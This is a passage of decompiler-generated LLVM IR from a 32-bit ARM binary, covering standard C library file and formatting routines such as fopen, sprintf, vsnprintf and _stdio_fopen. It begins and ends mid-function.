  %v2_b560 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_b560, i32* @r4, align 4
  store i32 %v6_b248, i32* @r5, align 4
  store i32 %v9_b248, i32* @r6, align 4
  store i32 %v12_b248, i32* @r7, align 4
  store i32 %v15_b248, i32* @r8, align 4
  store i32 %v27_b248, i32* @lr, align 4
  ret i32 %v0_b558

; uselistorder directives
  uselistorder i32 %v0_b528, { 1, 0, 2 }
  uselistorder i32 %v1_b50c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b4fc, { 1, 0 }
  uselistorder i32 %v0_b4d0, { 1, 0 }
  uselistorder i32 %v0_b4b8, { 1, 0, 2 }
  uselistorder i32 %v1_b49c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_b484, { 1, 0 }
  uselistorder i32 %v0_b43c, { 1, 0, 2 }
  uselistorder i32 %v1_b420.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b3b0, { 1, 0, 2 }
  uselistorder i32 %v1_b394.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b384, { 1, 0 }
  uselistorder i32 %v0_b340, { 1, 0, 2 }
  uselistorder i32 %v1_b324.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b304, { 1, 0 }
  uselistorder i32 %v1_b290.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13, 16, 14, 15, 17, 19, 18, 46, 20, 21, 22, 23, 24, 26, 25, 45, 27, 28, 29, 30, 32, 31, 43, 33, 34, 35, 36, 37, 38, 39, 41, 40, 44, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 1, 7, 8, 10, 9, 2, 11, 12, 13, 14, 34, 35, 15, 16, 17, 18, 19, 30, 31, 20, 21, 23, 22, 0, 24, 25, 26, 27, 32, 33, 28, 29 }
  uselistorder label %dec_label_pc_b554, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b52c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b514, { 1, 0 }
  uselistorder label %dec_label_pc_b4cc, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_b4bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b4a4, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_b468, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b440, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b428, { 1, 0 }
  uselistorder label %dec_label_pc_b3dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b3b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b39c, { 1, 0 }
  uselistorder label %dec_label_pc_b354, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_b344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b32c, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_b2cc, { 1, 0 }
  uselistorder label %dec_label_pc_b2c0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b298, { 1, 0 }
}

define i32 @function_b56c(i32 %arg1) local_unnamed_addr {
dec_label_pc_b56c:
  %v0_b56c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b56c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b56c
  %v2_b56c = load i32, i32* @r8, align 4
  %v5_b56c = udiv i32 %v2_b56c, 2
  %v6_b56c = and i32 %v5_b56c, %arg1
  %v2_b570 = load i32, i32* @ip, align 4
  %v3_b570 = and i32 %v6_b56c, %v2_b570
  %v8_b574 = ashr i32 %v2_b56c, %v3_b570
  %v9_b574 = and i32 %v8_b574, %v3_b570
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b56c, %bb
  %v10_b574 = phi i32 [ %arg1, %dec_label_pc_b56c ], [ %v9_b574, %bb ]
  ret i32 %v10_b574

; uselistorder directives
  uselistorder i32 %v2_b56c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_b588 = call i32 @_stdio_fopen()
  ret i32 %v0_b588
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_b5ac = call i32 @__GI_vsnprintf()
  ret i32 %v0_b5ac
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_b5c8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_b5c8, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_b5dc = call i32 @__GI_vsnprintf()
  ret i32 %v0_b5dc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ()* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %v3_b5f0 = load i32, i32* @r4, align 4
  %v6_b5f0 = load i32, i32* @r5, align 4
  %v9_b5f0 = load i32, i32* @r6, align 4
  %v2_b604 = ptrtoint i32* %stack_var_-96 to i32
  %v0_b608 = load i32, i32* @r0, align 4
  store i32 %v0_b608, i32* @r4, align 4
  %v0_b60c = load i32, i32* @r2, align 4
  %v0_b610 = load i32, i32* @r1, align 4
  store i32 %v0_b610, i32* @r5, align 4
  %v1_b628 = sub i32 -1, %v0_b608
  store i32 %v1_b628, i32* @lr, align 4
  %v0_b62c = load i32, i32* @r3, align 4
  store i32 %v0_b62c, i32* @r2, align 4
  %v3_b634 = icmp ult i32 %v0_b610, %v1_b628
  br i1 %v3_b634, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_b628, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_b644 = phi i32 [ %v0_b610, %entry ], [ %v1_b628, %bb ]
  %v2_b644 = add i32 %v1_b644, %v0_b608
  store i32 %v2_b644, i32* @ip, align 4
  store i32 0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_b684 = inttoptr i32 %v0_b60c to i8*
  %v3_b684 = call i32 @_vfprintf_internal(i32 %v2_b604, i8* %v2_b684)
  %v0_b688 = load i32, i32* @r5, align 4
  %v1_b688 = load i32, i32* @r6, align 4
  %v9_b688 = icmp eq i32 %v0_b688, %v1_b688
  br i1 %v9_b688, label %dec_label_pc_b6ac, label %dec_label_pc_b690

dec_label_pc_b690:                                ; preds = %bb26
  %v9_b698 = icmp eq i32 %v1_b644, 0
  br i1 %v9_b698, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_b690
  %v2_b69c = add i32 %v0_b608, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_b690, %bb27
  %v1_b6a0 = phi i32 [ %v2_b644, %dec_label_pc_b690 ], [ %v2_b69c, %bb27 ]
  %v1_b6a0.v0_b67c = select i1 %v9_b698, i32 %v1_b6a0, i32 %v0_b608
  %stack_var_-80.0 = inttoptr i32 %v1_b6a0.v0_b67c to i8*
  %v1_b6a8 = trunc i32 %v1_b688 to i8
  store i8 %v1_b6a8, i8* %stack_var_-80.0, align 1
  br label %dec_label_pc_b6ac

dec_label_pc_b6ac:                                ; preds = %bb26, %bb28
  store i32 %v3_b5f0, i32* @r4, align 4
  store i32 %v6_b5f0, i32* @r5, align 4
  store i32 %v9_b5f0, i32* @r6, align 4
  ret i32 %v3_b684

; uselistorder directives
  uselistorder i1 %v9_b698, { 1, 0 }
  uselistorder i32 %v1_b644, { 1, 0 }
  uselistorder i32 %v1_b628, { 3, 2, 1, 0 }
  uselistorder i32 %v0_b608, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_b6ac, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b6c0 = load i32, i32* @r4, align 4
  store i32 %v3_b6c0, i32* %stack_var_-24, align 4
  %v6_b6c0 = load i32, i32* @r5, align 4
  %v9_b6c0 = load i32, i32* @r6, align 4
  %v12_b6c0 = load i32, i32* @r7, align 4
  %v15_b6c0 = load i32, i32* @r8, align 4
  %v0_b6c4 = load i32, i32* @r1, align 4
  %v1_b6c4 = inttoptr i32 %v0_b6c4 to i8*
  %v2_b6c4 = load i8, i8* %v1_b6c4, align 1
  %v3_b6c4 = zext i8 %v2_b6c4 to i32
  store i32 %v3_b6c4, i32* @ip, align 4
  %v2_b6cc = icmp ugt i8 %v2_b6c4, 113
  store i1 %v2_b6cc, i1* %cpsr_c.global-to-local, align 1
  %v7_b6cc = icmp eq i8 %v2_b6c4, 114
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r8, align 4
  %v0_b6d8 = load i32, i32* @r0, align 4
  store i32 %v0_b6d8, i32* @r7, align 4
  %v0_b6dc = load i32, i32* @r2, align 4
  store i32 %v0_b6dc, i32* @r5, align 4
  %v0_b6e0 = load i32, i32* @r3, align 4
  store i32 %v0_b6e0, i32* @r6, align 4
  br i1 %v7_b6cc, label %dec_label_pc_b734, label %dec_label_pc_b6e8

dec_label_pc_b6e8:                                ; preds = %entry
  %v2_b6e8 = icmp ugt i8 %v2_b6c4, 118
  store i1 %v2_b6e8, i1* %cpsr_c.global-to-local, align 1
  %v7_b6e8 = icmp eq i8 %v2_b6c4, 119
  br i1 %v7_b6e8, label %bb, label %dec_label_pc_b6f4

bb:                                               ; preds = %dec_label_pc_b6e8
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_b738

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6e8
  %v2_b6f4 = icmp ugt i8 %v2_b6c4, 96
  store i1 %v2_b6f4, i1* %cpsr_c.global-to-local, align 1
  %v7_b6f4 = icmp eq i8 %v2_b6c4, 97
  br i1 %v7_b6f4, label %bb49, label %dec_label_pc_b700

bb49:                                             ; preds = %dec_label_pc_b6f4
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_b738

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6f4, %dec_label_pc_b7d0, %dec_label_pc_b7a4
  store i32 96852, i32* %r2.global-to-local, align 4
  %v0_b704 = call i32 @__aeabi_read_tp()
  store i32 %v0_b704, i32* %r0.global-to-local, align 4
  %v3_b708 = load i16, i16* @global_var_23164.175, align 2
  %v4_b708 = sext i16 %v3_b708 to i32
  store i32 %v4_b708, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_b710 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b710 = icmp eq i32 %v0_b710, 0
  %v3_b714 = add i32 %v4_b708, %v0_b704
  %v4_b714 = inttoptr i32 %v3_b714 to i32*
  store i32 22, i32* %v4_b714, align 4
  br i1 %v2_b710, label %dec_label_pc_bad8, label %dec_label_pc_b71c

dec_label_pc_b71c:                                ; preds = %dec_label_pc_b7f4._crit_edge, %dec_label_pc_b700
  %v0_b71c = load i32, i32* @r5, align 4
  %v1_b71c = inttoptr i32 %v0_b71c to i16*
  %v2_b71c = load i16, i16* %v1_b71c, align 2
  %v3_b71c = zext i16 %v2_b71c to i32
  store i32 %v3_b71c, i32* %r3.global-to-local, align 4
  %v1_b720 = and i32 %v3_b71c, 8192
  %v2_b720 = icmp eq i32 %v1_b720, 0
  br i1 %v2_b720, label %dec_label_pc_bad8, label %dec_label_pc_b728

dec_label_pc_b728:                                ; preds = %dec_label_pc_b71c
  store i32 %v0_b71c, i32* @r0, align 4
  %v0_b72c = call i32 @free()
  store i32 %v0_b72c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bad8

dec_label_pc_b734:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b738

dec_label_pc_b738:                                ; preds = %bb, %bb49, %dec_label_pc_b734
  %v1_b750 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_b734 ]
  %v1_b738 = add i32 %v0_b6c4, 1
  %v2_b738 = inttoptr i32 %v1_b738 to i8*
  %v3_b738 = load i8, i8* %v2_b738, align 1
  %v2_b73c = icmp ugt i8 %v3_b738, 97
  store i1 %v2_b73c, i1* %cpsr_c.global-to-local, align 1
  %v7_b73c = icmp eq i8 %v3_b738, 98
  %v1_b738.v0_b6c4 = select i1 %v7_b73c, i32 %v1_b738, i32 %v0_b6c4
  store i32 %v1_b738.v0_b6c4, i32* %r3.global-to-local, align 4
  %v1_b748 = add i32 %v1_b738.v0_b6c4, 1
  %v2_b748 = inttoptr i32 %v1_b748 to i8*
  %v3_b748 = load i8, i8* %v2_b748, align 1
  %v4_b748 = zext i8 %v3_b748 to i32
  store i32 %v4_b748, i32* @r3, align 4
  %v2_b74c = icmp ugt i8 %v3_b748, 42
  store i1 %v2_b74c, i1* %cpsr_c.global-to-local, align 1
  %v7_b74c = icmp eq i8 %v3_b748, 43
  br i1 %v7_b74c, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_b738
  store i32 %v1_b750, i32* @r3, align 4
  %v2_b754 = add nuw nsw i32 %v1_b750, 1
  store i32 %v2_b754, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_b738, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b758 = icmp eq i32 %v0_b6dc, 0
  br i1 %v2_b758, label %dec_label_pc_b760, label %dec_label_pc_b79c

dec_label_pc_b760:                                ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_b764 = call i32 @malloc(i32 68)
  store i32 %v1_b764, i32* %r0.global-to-local, align 4
  store i32 %v1_b764, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_b768 = icmp eq i32 %v1_b764, 0
  br i1 %v3_b768, label %dec_label_pc_badc, label %dec_label_pc_b770

dec_label_pc_b770:                                ; preds = %dec_label_pc_b760
  %v0_b774 = load i32, i32* @r8, align 4
  %v2_b774 = add i32 %v0_b774, -38188
  store i32 %v2_b774, i32* %r3.global-to-local, align 4
  %v1_b778 = inttoptr i32 %v2_b774 to i32*
  %v2_b778 = load i32, i32* %v1_b778, align 4
  store i32 %v2_b778, i32* %r0.global-to-local, align 4
  %v3_b778 = add i32 %v0_b774, -38184
  %v4_b778 = inttoptr i32 %v3_b778 to i32*
  %v5_b778 = load i32, i32* %v4_b778, align 4
  store i32 %v5_b778, i32* @r1, align 4
  %v6_b778 = add i32 %v0_b774, -38180
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  %v8_b778 = load i32, i32* %v7_b778, align 4
  store i32 %v8_b778, i32* %r2.global-to-local, align 4
  %v2_b784 = add i32 %v1_b764, 8
  %v3_b784 = inttoptr i32 %v2_b784 to i32*
  store i32 0, i32* %v3_b784, align 4
  store i32 8192, i32* @ip, align 4
  %v2_b78c = load i32, i32* @r5, align 4
  %v3_b78c = inttoptr i32 %v2_b78c to i16*
  store i16 8192, i16* %v3_b78c, align 2
  %v2_b790 = load i32, i32* %r0.global-to-local, align 4
  %v0_b794 = load i32, i32* @r5, align 4
  %v1_b794 = add i32 %v0_b794, 56
  store i32 %v1_b794, i32* @r3, align 4
  %v1_b798 = inttoptr i32 %v1_b794 to i32*
  store i32 %v2_b790, i32* %v1_b798, align 4
  %v3_b798 = add i32 %v0_b794, 60
  %v4_b798 = inttoptr i32 %v3_b798 to i32*
  %v5_b798 = load i32, i32* @r1, align 4
  store i32 %v5_b798, i32* %v4_b798, align 4
  %v6_b798 = add i32 %v0_b794, 64
  %v7_b798 = inttoptr i32 %v6_b798 to i32*
  %v8_b798 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b798, i32* %v7_b798, align 4
  %v0_b79c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b79c

dec_label_pc_b79c:                                ; preds = %.thread3, %dec_label_pc_b770
  %v0_b7f4 = phi i32 [ %v0_b6e0, %.thread3 ], [ %v0_b79c.pre, %dec_label_pc_b770 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_b79c = icmp slt i32 %v0_b7f4, 0
  br i1 %v1_b79c, label %dec_label_pc_b7f4, label %dec_label_pc_b7a4

dec_label_pc_b7a4:                                ; preds = %dec_label_pc_b79c
  %v0_b7a8 = load i32, i32* @r4, align 4
  %v2_b7a8 = and i32 %v0_b7a8, 131075
  %v1_b7ac = add nuw nsw i32 %v2_b7a8, 1
  store i32 %v1_b7ac, i32* %r2.global-to-local, align 4
  %v0_b7b0 = load i32, i32* @r7, align 4
  %v1_b7b0 = add i32 %v0_b7b0, 1
  %v2_b7b4 = and i32 %v1_b7b0, %v1_b7ac
  store i32 %v2_b7b4, i32* %r3.global-to-local, align 4
  %v3_b7b8 = icmp uge i32 %v2_b7b4, %v1_b7ac
  store i1 %v3_b7b8, i1* %cpsr_c.global-to-local, align 1
  %v9_b7b8 = icmp eq i32 %v2_b7b4, %v1_b7ac
  %v1_b7bc = load i32, i32* @r5, align 4
  %v2_b7bc = add i32 %v1_b7bc, 4
  %v3_b7bc = inttoptr i32 %v2_b7bc to i32*
  store i32 %v0_b7f4, i32* %v3_b7bc, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7c4, label %dec_label_pc_b700

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b7a4
  %v0_b7c4 = load i32, i32* @r4, align 4
  %v1_b7c4 = load i32, i32* @r7, align 4
  %v2_b7c4 = sub i32 -1, %v1_b7c4
  %v3_b7c4 = and i32 %v0_b7c4, %v2_b7c4
  store i32 %v3_b7c4, i32* @r3, align 4
  %v1_b7c8 = and i32 %v3_b7c4, 1024
  %v2_b7c8 = icmp eq i32 %v1_b7c8, 0
  br i1 %v2_b7c8, label %dec_label_pc_b7e8, label %dec_label_pc_b7d0

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c4
  %v0_b7d0 = load i32, i32* @r6, align 4
  store i32 %v0_b7d0, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b7dc = call i32 @__libc_fcntl(i32 %v0_b7d0, i32 4)
  store i32 %v2_b7dc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b7e0 = icmp eq i32 %v2_b7dc, 0
  br i1 %v2_b7e0, label %dec_label_pc_b7d0.dec_label_pc_b7e8_crit_edge, label %dec_label_pc_b700

dec_label_pc_b7d0.dec_label_pc_b7e8_crit_edge:    ; preds = %dec_label_pc_b7d0
  %v0_b7e8.pre = load i32, i32* @r7, align 4
  %v0_b7ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b7e8

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b7d0.dec_label_pc_b7e8_crit_edge, %dec_label_pc_b7c4
  %v0_b7ec = phi i32 [ %v0_b7ec.pre, %dec_label_pc_b7d0.dec_label_pc_b7e8_crit_edge ], [ %v0_b7c4, %dec_label_pc_b7c4 ]
  %v0_b7e8 = phi i32 [ %v0_b7e8.pre, %dec_label_pc_b7d0.dec_label_pc_b7e8_crit_edge ], [ %v1_b7c4, %dec_label_pc_b7c4 ]
  %v1_b7e8 = and i32 %v0_b7e8, 131072
  store i32 %v1_b7e8, i32* %r3.global-to-local, align 4
  %v2_b7ec = or i32 %v1_b7e8, %v0_b7ec
  store i32 %v2_b7ec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b818

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b79c
  %v2_b7f4 = icmp eq i32 %v0_b7f4, -1
  store i1 %v2_b7f4, i1* %cpsr_c.global-to-local, align 1
  %v7_b7f4 = icmp eq i32 %v0_b7f4, -1
  %v0_b800.pre = load i32, i32* @r4, align 4
  br i1 %v7_b7f4, label %dec_label_pc_b7f4._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_b7f4
  %v2_b7f8 = or i32 %v0_b800.pre, 131072
  store i32 %v2_b7f8, i32* @r4, align 4
  br label %dec_label_pc_b7f4._crit_edge

dec_label_pc_b7f4._crit_edge:                     ; preds = %dec_label_pc_b7f4, %bb53
  %v0_b800 = phi i32 [ %v2_b7f8, %bb53 ], [ %v0_b800.pre, %dec_label_pc_b7f4 ]
  %v0_b7fc = load i32, i32* @r7, align 4
  store i32 %v0_b7fc, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_b808 = call i32 @__libc_open(i32 %v0_b7fc, i32 %v0_b800)
  store i32 %v2_b808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_b80c = icmp slt i32 %v2_b808, 0
  %v1_b810 = load i32, i32* @r5, align 4
  %v2_b810 = add i32 %v1_b810, 4
  %v3_b810 = inttoptr i32 %v2_b810 to i32*
  store i32 %v2_b808, i32* %v3_b810, align 4
  br i1 %v1_b80c, label %dec_label_pc_b71c, label %.dec_label_pc_b818_crit_edge

.dec_label_pc_b818_crit_edge:                     ; preds = %dec_label_pc_b7f4._crit_edge
  %v0_b81c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b818

dec_label_pc_b818:                                ; preds = %.dec_label_pc_b818_crit_edge, %dec_label_pc_b7e8
  %v0_b834 = phi i32 [ %v0_b81c.pre, %.dec_label_pc_b818_crit_edge ], [ %v2_b7ec, %dec_label_pc_b7e8 ]
  %v0_b818 = load i32, i32* @r5, align 4
  %v1_b818 = inttoptr i32 %v0_b818 to i16*
  %v2_b818 = load i16, i16* %v1_b818, align 2
  %v3_b818 = zext i16 %v2_b818 to i32
  %v1_b81c = urem i32 %v0_b834, 4
  %v1_b820 = and i32 %v0_b834, 1024
  %v1_b824 = and i32 %v3_b818, 8192
  %v1_b828 = add nuw nsw i32 %v1_b81c, 1
  %v2_b82c = or i32 %v1_b824, %v1_b820
  store i32 %v2_b82c, i32* %r3.global-to-local, align 4
  %v1_b830 = xor i32 %v1_b828, 3
  %v1_b834 = and i32 %v0_b834, 131072
  store i32 %v1_b834, i32* %r2.global-to-local, align 4
  %v2_b834 = icmp eq i32 %v1_b834, 0
  %v1_b838 = add i32 %v0_b818, 4
  %v2_b838 = inttoptr i32 %v1_b838 to i32*
  %v3_b838 = load i32, i32* %v2_b838, align 4
  store i32 %v3_b838, i32* @r4, align 4
  br i1 %v2_b834, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_b818
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_b818, %bb54
  %v0_b844 = phi i32 [ 0, %dec_label_pc_b818 ], [ 32768, %bb54 ]
  %v4_b840 = mul nuw nsw i32 %v1_b830, 16
  %v5_b840 = or i32 %v2_b82c, %v4_b840
  store i32 %v5_b840, i32* %r3.global-to-local, align 4
  %v2_b844 = or i32 %v0_b844, %v5_b840
  store i32 %v2_b844, i32* %r2.global-to-local, align 4
  %v2_b848 = icmp ugt i32 %v3_b838, 2147483646
  store i1 %v2_b848, i1* %cpsr_c.global-to-local, align 1
  %v8_b848 = icmp eq i32 %v3_b838, 2147483647
  %v1_b84c = trunc i32 %v2_b844 to i16
  store i16 %v1_b84c, i16* %v1_b818, align 2
  br i1 %v8_b848, label %dec_label_pc_b88c, label %dec_label_pc_b854

dec_label_pc_b854:                                ; preds = %bb55
  store i32 96512, i32* %r3.global-to-local, align 4
  %v0_b858 = call i32 @__aeabi_read_tp()
  %v3_b85c = load i16, i16* @global_var_23164.175, align 2
  %v4_b85c = sext i16 %v3_b85c to i32
  store i32 %v4_b85c, i32* @r3, align 4
  store i32 %v0_b858, i32* @r6, align 4
  %v0_b864 = load i32, i32* @r4, align 4
  store i32 %v0_b864, i32* @r0, align 4
  %v2_b868 = add i32 %v4_b85c, %v0_b858
  %v3_b868 = inttoptr i32 %v2_b868 to i32*
  %v4_b868 = load i32, i32* %v3_b868, align 4
  store i32 %v4_b868, i32* @r4, align 4
  %v1_b86c = call i32 @isatty(i32 %v0_b864)
  store i32 %v1_b86c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b870 = icmp eq i32 %v1_b86c, 0
  br i1 %v2_b870, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_b854
  %v1_b874 = load i32, i32* @r5, align 4
  %v2_b874 = inttoptr i32 %v1_b874 to i16*
  %v3_b874 = load i16, i16* %v2_b874, align 2
  %v4_b874 = zext i16 %v3_b874 to i32
  %v2_b878 = or i32 %v4_b874, 256
  store i32 %v2_b878, i32* %r3.global-to-local, align 4
  %v2_b87c = trunc i32 %v2_b878 to i16
  store i16 %v2_b87c, i16* %v2_b874, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_b854, %bb56
  %v3_b884 = load i16, i16* @global_var_23164.175, align 2
  %v4_b884 = sext i16 %v3_b884 to i32
  store i32 %v4_b884, i32* %r3.global-to-local, align 4
  %v0_b888 = load i32, i32* @r4, align 4
  %v1_b888 = load i32, i32* @r6, align 4
  %v3_b888 = add i32 %v1_b888, %v4_b884
  %v4_b888 = inttoptr i32 %v3_b888 to i32*
  store i32 %v0_b888, i32* %v4_b888, align 4
  br label %dec_label_pc_b88c

dec_label_pc_b88c:                                ; preds = %bb55, %.thread5
  %v0_b88c = load i32, i32* @r5, align 4
  %v1_b88c = add i32 %v0_b88c, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b890 = icmp eq i32 %v3_b88c, 0
  br i1 %v2_b890, label %dec_label_pc_b898, label %bb57

dec_label_pc_b898:                                ; preds = %dec_label_pc_b88c
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_b89c = call i32 @malloc(i32 4096)
  store i32 %v1_b89c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b8a0 = icmp eq i32 %v1_b89c, 0
  %v1_b8b0.pre = load i32, i32* @r5, align 4
  br i1 %v2_b8a0, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_b898
  %v2_b8a4 = inttoptr i32 %v1_b8b0.pre to i16*
  %v3_b8a4 = load i16, i16* %v2_b8a4, align 2
  %v4_b8a4 = zext i16 %v3_b8a4 to i32
  %v2_b8a8 = add i32 %v1_b89c, 4096
  store i32 %v2_b8a8, i32* %r2.global-to-local, align 4
  %v2_b8ac = or i32 %v4_b8a4, 16384
  store i32 %v2_b8ac, i32* %r3.global-to-local, align 4
  %v2_b8b0 = add i32 %v1_b8b0.pre, 8
  %v3_b8b0 = inttoptr i32 %v2_b8b0 to i32*
  store i32 %v1_b89c, i32* %v3_b8b0, align 4
  %v1_b8b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b8b4 = load i32, i32* @r5, align 4
  %v3_b8b4 = add i32 %v2_b8b4, 12
  %v4_b8b4 = inttoptr i32 %v3_b8b4 to i32*
  store i32 %v1_b8b4, i32* %v4_b8b4, align 4
  %v1_b8b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_b8b8 = trunc i32 %v1_b8b8 to i16
  %v3_b8b8 = load i32, i32* @r5, align 4
  %v4_b8b8 = inttoptr i32 %v3_b8b8 to i16*
  store i16 %v2_b8b8, i16* %v4_b8b8, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_b898
  %v2_b8b037 = add i32 %v1_b8b0.pre, 8
  %v3_b8b038 = inttoptr i32 %v2_b8b037 to i32*
  store i32 0, i32* %v3_b8b038, align 4
  %v2_b8bc = load i32, i32* @r5, align 4
  %v3_b8bc = add i32 %v2_b8bc, 12
  %v4_b8bc = inttoptr i32 %v3_b8bc to i32*
  store i32 0, i32* %v4_b8bc, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_b88c, %.thread9
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_b8c8 = load i32, i32* @r8, align 4
  %v2_b8c8 = add i32 %v0_b8c8, 100
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  %v4_b8c8 = load i32, i32* %v3_b8c8, align 4
  store i32 %v4_b8c8, i32* %r3.global-to-local, align 4
  %v2_b8cc = load i32, i32* @r5, align 4
  %v3_b8cc = add i32 %v2_b8cc, 2
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
